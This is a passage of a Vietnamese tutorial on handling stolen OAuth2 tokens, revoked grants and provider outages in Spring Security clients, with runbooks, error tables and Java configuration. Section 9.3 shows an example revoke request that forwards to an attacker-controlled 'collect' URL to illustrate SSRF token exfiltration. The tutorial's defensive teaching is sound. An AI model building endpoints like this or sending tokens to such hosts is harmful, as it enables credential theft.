# 27.13. Xử lý token bị đánh cắp, quyền bị thu hồi và sự cố provider

## 1. Ba tình huống thường bị nhầm trong OAuth2/OIDC Client

Trong ứng dụng **Spring Security OAuth 2.0 OIDC Client**, một Access Token có thể ngừng hoạt động vì hết hạn, người dùng thu hồi quyền, Authorization Server thay đổi chính sách hoặc chính token đã bị đánh cắp. Trong khi đó, một lỗi kết nối tới OpenID Provider (OP) lại có thể chỉ là sự cố hạ tầng tạm thời.

Ba nhóm sự kiện cần xử lý khác nhau:

1. **Token bị đánh cắp hoặc nghi bị lộ:** mục tiêu là **ngăn sử dụng credential, giới hạn thiệt hại, điều tra và khôi phục quyền theo quy trình an toàn**.
2. **Quyền cấp cho ứng dụng bị thu hồi:** mục tiêu là **không dùng lại token/grant đã bị từ chối, không tự nâng quyền và hướng user cấp quyền lại nếu phù hợp**.
3. **Provider gặp sự cố:** mục tiêu là **không làm mất dữ liệu/token hợp lệ hoặc tạo bão retry, duy trì ranh giới bảo mật và phục hồi có kiểm soát**.

Ví dụ:

~~~text
                        Spring Boot OAuth2/OIDC Client
                                  |
                 OAuth2AuthorizedClientManager
                                  |
                     Authorized Client Store
                         /              \
                  Access Token       Refresh Token
                         |              |
                         v              v
                  Resource Server   Token Endpoint
                         |              |
                    HTTP 401/403    invalid_grant / 503
                         \              /
                          \            /
                           Incident classifier
                                 |
          +----------------------+---------------------+
          |                      |                     |
       COMPROMISE           REVOKED GRANT         OP OUTAGE
       Quarantine           Reauthorize          Backoff
       Revoke/rotate        only with consent     Preserve store
       Investigate         No privilege bypass   Degraded mode
~~~

Đặc biệt: **HTTP 401 không tự chứng minh token bị đánh cắp**, **HTTP 403 không đồng nghĩa user đã thu hồi consent**, và **HTTP 503 của Token Endpoint không phải tín hiệu để xóa mọi Refresh Token**.

### Mục tiêu bài học

Sau bài này, bạn có thể:

- Lập threat model cho Access Token, Refresh Token, Client Secret, private key và OIDC session.
- Phân loại tín hiệu OAuth2 giữa Token Endpoint, Resource Server và provider outage.
- Hiểu sự khác nhau giữa **xóa authorized client local**, **revoke token ở Authorization Server**, **hủy RP session**, và **thu hồi grant**.
- Ứng phó sự cố credential với thứ tự: **containment → assessment → revocation/rotation → recovery → retrospective**.
- Cấu hình Spring Security authorized-client lifecycle và failure handlers ở Servlet và Reactive.
- Xây dựng retry/backoff/circuit breaker, tránh token refresh storm và sai lệch do concurrency.
- Thiết kế thông báo cho người dùng, observability, test và runbook vận hành.

> **Phạm vi:** OAuth2 Client/OIDC Login trong Spring Security, với Authorization Code + PKCE, Refresh Token và Client Credentials khi phù hợp. Ví dụ dùng các API phổ biến ở Spring Security 6.x/7.x; hãy đối chiếu dependency BOM, servlet/reactive stack và tài liệu của provider thật trước khi dùng production. Đây là bài thiết kế và vận hành, không thay thế quy trình ứng cứu sự cố của tổ chức.

## 2. Credential nào có thể bị lộ và hậu quả ra sao?

| Credential | Mục đích | Hậu quả nếu lộ |
| --- | --- | --- |
| **Access Token** | Gọi Resource Server | Kẻ tấn công có thể gọi API trong phạm vi token đến khi bị vô hiệu |
| **Refresh Token** | Xin Access Token mới | Có thể tạo token mới lâu hơn; rủi ro rộng và kéo dài |
| **Client Secret** | Chứng thực confidential client | Có thể cho phép giả mạo client trong các grant phù hợp |
| **Private key** cho `private_key_jwt` | Ký client assertions | Có thể bị dùng để giả mạo client nếu chưa rotate/revoke |
| **mTLS client private key/certificate** | Chứng thực client hoặc bind token | Rủi ro mạo danh sender theo policy |
| **ID Token** | OIDC authentication tại RP | Lộ PII/claims; không mặc định dùng làm API token |
| **Session cookie** `JSESSIONID`/`SESSION` | Truy cập local RP session | Có thể gây session hijacking |
| **Authorization code / PKCE verifier** | Authorization Code flow | Lộ trong thời điểm nhạy cảm có thể ảnh hưởng đổi token |

### 2.1. Bearer Access Token

Với một OAuth2 Bearer Token:

~~~http
Authorization: Bearer ACCESS_TOKEN_PLACEHOLDER
~~~

người sở hữu token có thể thử gửi token tới API. **Scope**, **audience**, **expiration**, **revocation** và **sender-constraining** giúp hạn chế tác hại, nhưng không làm token trở thành dữ liệu công khai.

### 2.2. Refresh Token là credential có vòng đời đặc biệt

Refresh Token thường chỉ gửi đến Token Endpoint; nếu bị đánh cắp, kẻ tấn công có thể xin Access Token mới, trừ khi các ràng buộc về client authentication, sender-binding, expiration, rotation hoặc chính sách của OP ngăn cản.

Theo **RFC 9700**, Authorization Server phải đánh giá rủi ro trước khi phát Refresh Token. Với public clients, Refresh Token phải có **sender constraint hoặc rotation** để phát hiện replay. Với confidential clients, việc refresh còn ràng buộc với client được cấp và cách chứng thực tương ứng.

### 2.3. Không phải mọi “token leak” giống nhau

~~~text
Case A: một Access Token 5 phút còn hạn bị ghi vào log
Case B: một Refresh Token lâu dài xuất hiện trong database dump
Case C: client secret production bị commit vào Git public
Case D: private_key_jwt signing key bị lộ
Case E: một user session cookie bị kẻ khác dùng
~~~

Mức độ ảnh hưởng, cách thu hồi và phạm vi phải điều tra **khác nhau**. Không áp một hành động “xóa cache” cho cả năm tình huống.

## 3. Threat model: token bị lấy từ đâu?

| Bề mặt | Ví dụ rủi ro | Phòng ngừa |
| --- | --- | --- |
| Application logs/APM | Log `Authorization` hoặc token response body | Redaction, structured logging |
| Database/Redis/backup | `OAuth2AuthorizedClient` lưu plaintext | Application encryption, IAM, retention |
| Reverse proxy/service mesh | Header tracing không lọc | Secure header logging, access controls |
| Browser/local storage | SPA lưu token trong `localStorage` | BFF pattern hoặc storage strategy theo threat model |
| Open redirect/SSRF | WebClient gửi Bearer Token tới host lạ | Host allowlist, tránh default token cho arbitrary URLs |
| Dependency/RCE | Attacker đọc process memory/token store | Patch, runtime isolation, egress control |
| Developer workstation | Token thật trong HTTP collection hoặc shell history | Test credentials và secrets hygiene |
| Authorization Server compromise | Signing keys/client registrations bị chiếm | Trust/key incident response với provider |
| Session hijack | Cookie bị lấy bởi XSS hoặc network/client compromise | HttpOnly, Secure, SameSite, CSP, session lifecycle |

**Mã hóa token ở database không ngăn** một process đã bị chiếm quyền đọc token sau khi giải mã. Cần kết hợp mã hóa, khóa KMS, access control, network egress, rotation và monitoring.

### 3.1. Không trộn “nghi lộ” với “đã xác nhận lộ”

Quy trình thường chia tín hiệu:

- **Suspected:** phát hiện khả nghi nhưng chưa chứng minh token bị lấy.
- **Confirmed exposure:** có bằng chứng token đã xuất hiện ở vị trí trái phép.
- **Confirmed misuse:** có bằng chứng token đã được dùng trái phép.

Với credential quyền cao, **containment có thể cần triển khai ngay khi còn nghi ngờ**, trước khi điều tra đầy đủ. Nhưng hệ thống vẫn phải lưu mức độ chắc chắn, phạm vi và hành động có thể phục hồi thay vì suy đoán mọi 401 là một vụ đánh cắp.

## 4. Phân biệt bốn tầng khi thấy lỗi

~~~text
Browser / User
   |
   v
RP (Spring Security OIDC Login)
   |    local authentication/session
   |
   +-----> Authorization Server / OP
   |       authorization, token, refresh, revocation, UserInfo
   |
   +-----> Resource Server / API
           Bearer validation, scopes, audience, business permissions
~~~

| Tầng | Dấu hiệu | Cần làm |
| --- | --- | --- |
| **RP local session** | Cookie hết hạn, logout, session invalid | Login lại theo local policy |
| **Authorization Server** | `invalid_grant`, `invalid_client`, `temporarily_unavailable` | Phân loại grant/secret/hạ tầng |
| **Resource Server** | `401 invalid_token`, `403 insufficient_scope` | Xem Access Token validation/permission |
| **Network/Provider** | DNS/TLS timeout, 429/502/503 | Degraded mode, retry có giới hạn |

**Không tự chuyển lỗi của một tầng thành kết luận ở tầng khác.** Ví dụ Resource Server 403 không chứng minh client secret đã bị lộ.

## 5. Bảng phân loại OAuth2 errors và hành động

| Nguồn | Lỗi | Ý nghĩa thường gặp | Hành động |
| --- | --- | --- | --- |
| Token Endpoint | `invalid_grant` | Code/Refresh Token/grant không hợp lệ, hết hạn, đã bị revoke hoặc bị replay | Dừng sử dụng grant cũ, yêu cầu cấp quyền lại khi phù hợp; kiểm tra concurrency |
| Token Endpoint | `invalid_client` | Chứng thực client thất bại | Kiểm tra secret/key/method/client policy; không retry vô hạn |
| Token Endpoint | `invalid_scope` | Scope không hợp lệ hoặc vượt quyền | Sửa yêu cầu/consent, không tự nâng quyền |
| Token Endpoint | `unauthorized_client` | Client không được phép dùng grant | Điều tra registration/policy |
| Authorization Endpoint | `access_denied` | User/OP từ chối authorization | Tôn trọng lựa chọn, không bypass |
| Authorization Endpoint | `temporarily_unavailable` | OP tạm quá tải/bảo trì | Thông báo tạm thời, bounded retry/đợi |
| Resource Server | 401, Bearer `invalid_token` | Access Token sai, hết hạn, revoke hoặc không phù hợp | Không tiếp tục gửi token stale; kiểm tra handler và token contract |
| Resource Server | 403, Bearer `insufficient_scope` | Thiếu scope cần cho resource | Không tự xin admin; chỉ thay đổi quyền qua workflow |
| Resource Server | 403 không có Bearer error | Business authorization/tenant/ACL | Điều tra quyền ở API, không tự xóa token |
| Revocation Endpoint | 200 | Token đã được revoke **hoặc đã không hợp lệ** | Coi yêu cầu vô hiệu hóa token đã đạt theo RFC 7009 |
| Revocation Endpoint | 503 | Chưa xác nhận token đã bị revoke | Giữ pending revocation, retry sau có giới hạn |
| Revocation Endpoint | `unsupported_token_type` | OP không hỗ trợ revoke loại token đó | Dùng biện pháp thay thế theo hợp đồng |
| OP / JWKS | TLS/DNS timeout, 503 | Sự cố provider hoặc network | Không tắt signature/issuer checks |

### 5.1. 401 và 403 cần đọc cả `WWW-Authenticate`

Ví dụ theo RFC 6750:

~~~http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer error="invalid_token"
~~~

~~~http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope", scope="reports.write"
~~~

Tùy implementation, API có thể trả mã lỗi khác hoặc body riêng. Hãy phân loại dựa trên **HTTP status + OAuth2 Bearer error + provider contract**, không dùng mã 401/403 đơn lẻ để suy ra token bị trộm.

### 5.2. `invalid_grant` có nhiều nguyên nhân

`invalid_grant` có thể do:

- Refresh Token hết hạn hoặc bị user thu hồi.
- OP đã rotate Refresh Token, client dùng lại bản cũ.
- Hai requests refresh đồng thời tạo race.
- Client dùng grant/token của registration khác.
- OP thay đổi chính sách hoặc grant bị vô hiệu.
- OP phát hiện replay và thu hồi token family.

**Không kết luận chắc chắn “attacker đã replay token”** chỉ từ lỗi này. Cần logs và dữ kiện từ OP, authorized client store và concurrency.

## 6. Runbook: phát hiện token bị đánh cắp

Khi có bằng chứng token trong log công khai, repository, backup rò rỉ hoặc lưu lượng token sử dụng bất thường:

### 6.1. Giai đoạn 1 — Xác nhận và giới hạn thiệt hại

1. Ghi nhận **thời điểm phát hiện**, loại credential, registration ID, provider alias, môi trường, tenant/principal bị ảnh hưởng; không đính raw token vào ticket.
2. Phân loại **Access Token**, **Refresh Token**, **Client Secret**, **private key** hay **session cookie**.
3. Xác định phạm vi: một user, một client, một tenant hay nhiều production instances.
4. Ngăn nguồn rò rỉ tiếp diễn: tắt log nhạy cảm, dừng endpoint debug, thu hẹp IAM và network egress nếu cần.
5. Cân nhắc đặt integration/user connection vào **QUARANTINED** để manager và workers không tiếp tục dùng credential bị nghi lộ.
6. Bảo toàn chứng cứ an toàn theo incident retention, không sao chép raw token ra nhiều kênh.
7. Kích hoạt nhóm bảo mật/provider liaison khi quy mô và mức độ rủi ro vượt ngưỡng.

### 6.2. Giai đoạn 2 — Thu hồi và thay thế credential

- Yêu cầu OP **revoke** token hoặc **revoke grant/token family** nếu được hỗ trợ.
- Với Refresh Token compromise: ưu tiên vô hiệu hóa Refresh Token và các grants liên quan; không chỉ xóa Access Token local.
- Với Access Token compromise: revoke nếu OP hỗ trợ; đánh giá TTL, Resource Server introspection/denylist và sender constraints.
- Với Client Secret compromise: rotate secret tại OP và trong secret manager, rollout các instances, rà soát các grants có thể bị ảnh hưởng.
- Với private key compromise: rotate/revoke key/certificate, cập nhật trusted registration và đánh giá sender-constrained tokens liên quan.
- Với session cookie compromise: invalidate local sessions, xem xét OP logout/re-authentication theo rủi ro và user policy.

### 6.3. Giai đoạn 3 — Phục hồi dịch vụ

1. Kiểm tra OP đã xác nhận hành động revoke/rotation theo hợp đồng.
2. Xóa/quarantine cached authorized clients phù hợp **đúng registration + principal + tenant**.
3. Cho phép người dùng cấp quyền lại bằng Authorization Code flow an toàn, khi còn phù hợp.
4. Không tự đưa lại Refresh Token từng bị lộ từ backup.
5. Giám sát lỗi bất thường/attempts sử dụng token cũ.
6. Chỉ đóng incident sau khi xác nhận mất khả năng sử dụng credential bị ảnh hưởng, hoặc ghi rõ residual risk khi chưa thể chứng minh.

### 6.4. Giai đoạn 4 — Hậu kiểm

Xác định root cause, thời gian tồn tại rủi ro, phạm vi dữ liệu, thời gian phát hiện và khả năng cô lập. Điều chỉnh log filtering, secret scanning, CI policy, encryption at rest, IAM và đào tạo. Nếu phát hiện có khả năng dữ liệu cá nhân bị ảnh hưởng, phối hợp bộ phận phụ trách nghĩa vụ thông báo theo pháp luật/chính sách liên quan.

## 7. Sơ đồ phản ứng với dấu hiệu token compromise

~~~mermaid
flowchart TD
    A["Phát hiện sự kiện bất thường"] --> B{"Credential có thể đã bị lộ?"}
    B -->|Chưa rõ| C["Thu thập bằng chứng an toàn + mức độ rủi ro"]
    B -->|Có / high risk| D["Quarantine đúng principal/registration/client"]
    C --> E{"Có đủ rủi ro cần containment?"}
    E -->|Có| D
    E -->|Không| F["Theo dõi + điều tra, không xóa hàng loạt"]
    D --> G{"Loại credential?"}
    G -->|Access Token| H["Revoke nếu hỗ trợ, giảm TTL/scope, kiểm tra RS"]
    G -->|Refresh Token| I["Revoke grant/token family, block refresh"]
    G -->|Client Secret / key| J["Rotate key/secret, provider coordination"]
    G -->|Session cookie| K["Invalidate session + re-auth policy"]
    H --> L["Xóa/quarantine local cache và monitor"]
    I --> L
    J --> L
    K --> L
    L --> M["Reauthorize/reconnect theo workflow hợp lệ"]
    M --> N["Xác minh + incident retrospective"]
~~~

**Quarantine khác delete:** quarantine ngăn các tác vụ mới dùng credential; delete xóa bản ghi local; revoke yêu cầu Authorization Server chặn sử dụng token. Trong incident, có thể cần cả ba nhưng **không thay thế nhau**.

## 8. Xóa authorized client local không phải revoke ở provider

Spring Security lưu:

~~~text
(registrationId, principalName) -> OAuth2AuthorizedClient
  Access Token
  Refresh Token, nếu có
~~~

Một thao tác:

~~~java
authorizedClientService.removeAuthorizedClient(
    registrationId, principalName);
~~~

chỉ xóa bản ghi trong **store mà service đó quản lý**. Nó không tự gửi HTTP request tới OP Revocation Endpoint.

### 8.1. Bốn hành động có phạm vi khác nhau

| Hành động | Thao tác thực sự |
| --- | --- |
| Xóa `OAuth2AuthorizedClient` local | Client không còn load token từ bản ghi đó |
| RFC 7009 token revocation | OP được yêu cầu vô hiệu hóa token được gửi |
| `HttpSession.invalidate()` / WebSession invalidation | Kết thúc local RP browser session |
| OIDC RP/Back-Channel Logout | Điều phối session logout với OP hoặc từ OP sang RP |

Không dùng cách diễn đạt “đã revoke toàn bộ quyền” khi mới gọi `removeAuthorizedClient`.

### 8.2. Xóa trước revoke có thể làm mất credential duy nhất

Phản ví dụ:

~~~text
1. Xóa Refresh Token khỏi database
2. Sau đó mới gọi revoke endpoint
3. OP đang 503
4. Không còn token value để gửi revoke lại
~~~

Nếu provider không xác nhận revoke, token có thể **vẫn còn hiệu lực**. Cách xử lý an toàn có thể là:

1. Đánh dấu connection **SUSPENDED/REVOKING** trước, chặn mọi outbound use.
2. Chuyển token cần revoke vào **encrypted restricted revocation queue** hoặc giữ bản ghi bị khóa sử dụng.
3. Gửi revoke với credential đúng client và endpoint đã kiểm tra.
4. Khi OP xác nhận thành công theo contract, xóa token local/queue theo retention policy.
5. Nếu OP tạm lỗi, giữ trạng thái pending và retry có giới hạn, có giám sát.

Không biến một queue này thành kho token plaintext thứ hai. Tất cả bản sao phải mã hóa, kiểm soát quyền và có TTL/retention rõ.

## 9. RFC 7009: hiểu đúng Token Revocation Endpoint

Authorization Server có thể công bố `revocation_endpoint` trong metadata. Client gửi **HTTPS POST**, thường với content type `application/x-www-form-urlencoded`:

~~~http
POST /oauth2/revoke HTTP/1.1
Host: id.example.net
Authorization: Basic BASE64_CLIENT_CREDENTIALS_PLACEHOLDER
Content-Type: application/x-www-form-urlencoded

token=REFRESH_TOKEN_PLACEHOLDER&token_type_hint=refresh_token
~~~

Ví dụ chỉ minh họa request, **không có token/secret thật**. Phương thức chứng thực client phải đúng registration (ví dụ `client_secret_basic`, `client_secret_post`, `private_key_jwt`, mTLS...), không tự ép mọi provider dùng Basic.

### 9.1. Những điểm quan trọng của protocol

- `token` là tham số bắt buộc; `token_type_hint` là gợi ý (`refresh_token` hoặc `access_token`), không phải quyền mới.
- Endpoint phải đến từ **trusted provider metadata/config**, không lấy từ input của user.
- RFC 7009 trả **HTTP 200** khi token đã được revoke thành công **hoặc token vốn đã không hợp lệ**.
- HTTP 200 không cho biết token từng tồn tại hay user đã cố tình revoke.
- Với **HTTP 503**, client **phải giả định token vẫn tồn tại** và có thể retry sau thời gian hợp lý theo `Retry-After`.
- OP có thể revoke các tokens khác thuộc cùng authorization grant; phạm vi lan truyền phụ thuộc provider policy.
- Không OP nào bị bắt buộc hỗ trợ revoke mọi loại Access Token; có thể gặp `unsupported_token_type`.

### 9.2. Revoking Refresh Token có luôn khiến Access Token ngừng ngay?

Không được tự cam kết. RFC 7009 khuyến nghị khi revoke Refresh Token, Authorization Server cũng nên vô hiệu các Access Tokens liên quan nếu hỗ trợ revocation; nhưng cách triển khai và độ trễ propagation khác nhau. Một JWT tự chứa đã được Resource Server nhận có thể còn được chấp nhận đến khi hết hạn nếu không có introspection/denylist/session binding.

### 9.3. Không gọi revocation bằng URL do caller tự đưa

Một endpoint kiểu:

~~~text
POST /revoke?uri=https://attacker.example/collect
~~~

là nguy cơ **SSRF và token exfiltration**. Revocation URL phải thuộc allowlist/trusted registration. Đừng dùng WebClient có default Bearer Token để gọi arbitrary hosts.

### 9.4. Ngay cả với HTTP 200 vẫn cần kiểm soát ở local

Sau 200, client phải **không dùng lại token**. Cập nhật connection state và xóa local token phù hợp. Nếu có cache ở nhiều pods, broadcast invalidation hoặc dùng versioned state/shared store để không xuất hiện worker dùng bản stale.

## 10. Refresh Token rotation: từ tín hiệu đến điều tra

Với rotation:

~~~mermaid
sequenceDiagram
    autonumber
    participant App as Legitimate Client
    participant OP as Authorization Server
    participant Evil as Attacker
    App->>OP: refresh_token=R1
    OP-->>App: access_token=A2, refresh_token=R2
    Evil->>OP: refresh_token=R1 (đã invalidated)
    OP-->>Evil: invalid_grant / replay signal
    Note over OP: OP có thể revoke active token family
    App->>OP: refresh_token=R2
    OP-->>App: invalid_grant
~~~

Một replay signal có thể cho thấy **token family bị ảnh hưởng**, nhưng Authorization Server không luôn xác định được bên nào đã dùng token cũ. Ứng dụng cần phối hợp provider để biết phạm vi, revoke grant nếu phù hợp và yêu cầu reauthorization.

### 10.1. Concurrent refresh không phải tự động là trộm token

~~~text
Request A load R1
Request B load R1
Request A refresh -> nhận R2 và save
Request B refresh R1 -> invalid_grant
~~~

Đây có thể là **race condition hợp lệ**. Nếu response B dùng failure handler xóa record R2 của A, client sẽ mất token mới. Cần cân nhắc:

- Single-flight refresh theo `(registrationId, principalName, tenant)` nếu cần.
- Optimistic locking hoặc conditional versioned delete/update.
- Atomic persistence khi OP xoay Refresh Token.
- Không global lock tất cả users.
- Monitoring giúp phân biệt concurrency bug với compromise.

### 10.2. Đừng retry `invalid_grant` bằng chính Refresh Token cũ

Nếu grant đã bị thu hồi, retry vô hạn bằng R1 không tạo quyền mới mà có thể tăng alerts/rate limits. Chuyển state sang **REAUTH_REQUIRED** hoặc **SUSPENDED**, hiển thị thông điệp an toàn và dùng Authorization Code flow hợp lệ khi người dùng đồng ý.

## 11. Spring Security OAuth2AuthorizedClientManager xử lý những gì?

`OAuth2AuthorizedClientManager` chịu trách nhiệm:

1. Tìm đúng `ClientRegistration` và principal.
2. Tải authorized client hiện có.
3. Xin/refresh token theo `OAuth2AuthorizedClientProvider` khi cần.
4. Gọi success handler để lưu client mới.
5. Gọi failure handler khi authorization/re-authorization thất bại.

### 11.1. Default behavior với `invalid_grant`

Trong Spring Security, `DefaultOAuth2AuthorizedClientManager` (Servlet HTTP request context) và `AuthorizedClientServiceOAuth2AuthorizedClientManager` (ngoài Servlet request) có failure handler mặc định có thể **loại bỏ authorized client** khi re-authorization thất bại vì `invalid_grant`.

**Đây là cơ chế xử lý token stale**, không phải incident response đầy đủ: nó không tự điều tra theft, không tự revoke mọi grants tại provider và không tự gửi thông báo cho người dùng.

### 11.2. Custom failure handler có thể thay default logic

Nếu application gọi `manager.setAuthorizationFailureHandler(...)`, phải đánh giá xem handler mới có còn loại bỏ stale clients theo error code thích hợp không. Nếu handler custom chỉ ghi log, một Refresh Token không hợp lệ có thể bị thử lại liên tục.

Tương tự, custom success handler phải lưu Access Token/Refresh Token mới đúng store sau refresh; nếu không, token rotation có thể thất bại ở lần tiếp theo.

### 11.3. Không xóa dữ liệu khi Token Endpoint chỉ tạm unavailable

`temporarily_unavailable`, timeout, HTTP 429 hoặc 503 không chứng minh Refresh Token đã bị revoke. Không chạy:

~~~java
// PHẢN VÍ DỤ: không xóa mọi token vì một lỗi network.
catch (Exception ex) {
    authorizedClientService.removeAuthorizedClient(id, principal);
}
~~~

Hãy phân loại **permanent authorization failure** và **transient provider failure** trước khi cleanup.

## 12. Servlet: manager và provider configuration minh họa

Ví dụ Spring Security OAuth2 Client trong Servlet:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProvider;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class OAuth2ClientManagerConfig {

    @Bean
    OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository authorizedClients) {

        OAuth2AuthorizedClientProvider provider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .authorizationCode()
                .refreshToken()
                .clientCredentials()
                .build();

        DefaultOAuth2AuthorizedClientManager manager =
            new DefaultOAuth2AuthorizedClientManager(
                registrations, authorizedClients);

        manager.setAuthorizedClientProvider(provider);
        return manager;
    }
}
~~~

Ví dụ áp dụng cho code được gọi **trong Servlet HTTP request**. Background jobs không có `HttpServletRequest` nên thường cần `AuthorizedClientServiceOAuth2AuthorizedClientManager` với `OAuth2AuthorizedClientService`, principal hệ thống ổn định và provider phù hợp.

**Không cấu hình cả ba grants nếu sản phẩm không cần**. Với machine-to-machine Client Credentials, một manager riêng chỉ hỗ trợ `clientCredentials()` thường dễ kiểm soát scope/credential và secret rotation hơn.

## 13. Xử lý Resource Server 401/403 với Spring Security WebClient

Khi ứng dụng gọi một API qua WebClient, Spring Security có OAuth2 filter chèn Bearer Access Token. Filter cũng có thể chuyển lỗi `401/403` kèm Bearer error đến authorization failure handler.

### 13.1. Servlet WebClient với repository constructor

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServletOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.web.reactive.function.client.WebClient;

@Configuration
public class ReportsClientConfig {

    @Bean
    WebClient reportsWebClient(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository authorizedClients) {

        ServletOAuth2AuthorizedClientExchangeFilterFunction oauth2 =
            new ServletOAuth2AuthorizedClientExchangeFilterFunction(
                registrations, authorizedClients);

        return WebClient.builder()
            .baseUrl("https://reports.example.net")
            .apply(oauth2.oauth2Configuration())
            .build();
    }
}
~~~

Với constructor nhận **registrations + repository**, filter có thể cài sẵn `RemoveAuthorizedClientOAuth2AuthorizationFailureHandler`. Khi API trả Bearer error phù hợp, filter có thể loại bỏ authorized client cached để **request tiếp theo** có cơ hội nhận token mới.

### 13.2. Constructor nhận manager cần chú ý

~~~java
new ServletOAuth2AuthorizedClientExchangeFilterFunction(
    authorizedClientManager);
~~~

Với constructor nhận manager, filter **không tự cấu hình** failure handler xử lý lỗi từ Resource Server. Nếu muốn xóa authorized client sau Bearer `invalid_token` phù hợp, hãy cấu hình `setAuthorizationFailureHandler(...)` với `RemoveAuthorizedClientOAuth2AuthorizationFailureHandler`/remover đúng repository hoặc service. Đừng lẫn với manager's failure handler dành cho Token Endpoint authorization errors.

### 13.3. Không xóa token cho mọi 403

`403 insufficient_scope` là tín hiệu quyền chưa đủ, **không phải lý do tự chuyển sang registration quyền admin hoặc xóa grant của mọi user**. Spring handlers thường lọc theo OAuth2 error codes. Nếu tự viết HTTP filter, phải giữ sự phân biệt đó.

### 13.4. Không tự retry ngay mọi request

Failure handler có thể **remove cached client**, nhưng request hiện tại có thể vẫn trả 401. Việc tự retry phải xem:

- Method có idempotent không?
- Request body có thể gửi lại an toàn?
- Provider vừa cấp token mới có thật sự đúng audience?
- Có nguy cơ loop refresh → API 401 → refresh vô hạn?

Với POST/PATCH/DELETE, phải có idempotency key hoặc downstream transaction policy trước khi retry.

## 14. Local invalidation theo đúng principal và registration

Một service có thể chủ động xóa authorized client local **sau khi đã quyết định incident/cleanup policy**:

~~~java
package com.example.security;

import org.springframework.security.oauth2.client.OAuth2AuthorizedClientService;
import org.springframework.stereotype.Service;

@Service
public class LocalAuthorizedClientInvalidationService {

    private final OAuth2AuthorizedClientService authorizedClients;

    public LocalAuthorizedClientInvalidationService(
            OAuth2AuthorizedClientService authorizedClients) {
        this.authorizedClients = authorizedClients;
    }

    public void invalidateLocalRecord(
            String trustedRegistrationId,
            String trustedPrincipalName) {

        authorizedClients.removeAuthorizedClient(
            trustedRegistrationId,
            trustedPrincipalName);
    }
}
~~~

**Giới hạn quan trọng:** đây chỉ là **local service-store removal**. Nó không tự revoke token ở OP, không tự invalidate `HttpSession` và không bảo đảm đúng repository nếu manager thực tế đang dùng một store khác.

`trustedPrincipalName` phải được xác định server-side từ Authentication/identity mapping, không lấy từ `?username=bob` do caller tùy ý gửi. Với multi-tenant, phải xác minh quyền của caller trên tenant/connection trước khi xóa.

### 14.1. Kiểm kê store thật

Ứng dụng có thể lưu authorized clients tại:

- `OAuth2AuthorizedClientService` kiểu JDBC/in-memory.
- `OAuth2AuthorizedClientRepository` theo Servlet HttpSession.
- `ReactiveOAuth2AuthorizedClientService` hoặc `ServerOAuth2AuthorizedClientRepository` trong WebFlux.
- Custom Redis/JDBC encrypted store hoặc session serialization.

Không giả định xóa một entry ở JDBC sẽ xóa mọi bản sao trong sessions, background jobs và các pods.

## 15. Reactive/WebFlux: failure handling khác Servlet

Trong Reactive stack:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.registration.ReactiveClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.server.ServerOAuth2AuthorizedClientRepository;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.web.reactive.function.client.WebClient;

@Configuration
public class ReactiveReportsClientConfig {

    @Bean
    WebClient reactiveReportsWebClient(
            ReactiveClientRegistrationRepository registrations,
            ServerOAuth2AuthorizedClientRepository authorizedClients) {

        ServerOAuth2AuthorizedClientExchangeFilterFunction oauth2 =
            new ServerOAuth2AuthorizedClientExchangeFilterFunction(
                registrations, authorizedClients);

        return WebClient.builder()
            .baseUrl("https://reports.example.net")
            .filter(oauth2)
            .build();
    }
}
~~~

Với constructor nhận **registrations + server repository**, Reactive filter có failure handler mặc định chuyển các Bearer errors từ Resource Server tới `RemoveAuthorizedClientReactiveOAuth2AuthorizationFailureHandler` tùy mã lỗi.

Với constructor nhận:

~~~java
new ServerOAuth2AuthorizedClientExchangeFilterFunction(
    reactiveAuthorizedClientManager);
~~~

filter **không mặc định forward** Resource Server 401/403 đến failure handler. Cần cấu hình `setAuthorizationFailureHandler(...)` với `ReactiveOAuth2AuthorizationFailureHandler` nếu muốn cleanup tương ứng.

### 15.1. Reactive token-store deletion

~~~java
Mono<Void> cleanup =
    reactiveAuthorizedClientService.removeAuthorizedClient(
        trustedRegistrationId,
        trustedPrincipalName);
~~~

`Mono<Void>` phải được **compose và subscribe bởi framework**, không gọi `.block()` trên Reactor event loop hoặc tự `.subscribe()` tách khỏi transaction/incident workflow.

### 15.2. Reactive background jobs

Với jobs không có `ServerWebExchange`, dùng `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` thay vì manager phụ thuộc web request, với application principal rõ ràng. Điều này đặc biệt quan trọng khi service Client Credentials bị revoke hoặc client secret được rotate.

## 16. State machine cho connection: tránh gọi lại token bị khóa

Một hệ thống có nhiều workers nên quản lý connection bằng trạng thái:

~~~mermaid
stateDiagram-v2
    [*] --> ACTIVE
    ACTIVE --> SUSPENDED: nghi compromise / user tạm ngừng
    ACTIVE --> REAUTH_REQUIRED: invalid_grant / consent revoked
    ACTIVE --> DEGRADED: provider unavailable
    DEGRADED --> ACTIVE: provider recovered + policy permits
    DEGRADED --> SUSPENDED: risk escalated
    SUSPENDED --> REVOKING: submit revocation
    REVOKING --> DISCONNECTED: confirmed revocation + cleanup
    REVOKING --> PENDING_REVOCATION: OP outage/503
    PENDING_REVOCATION --> REVOKING: retry allowed
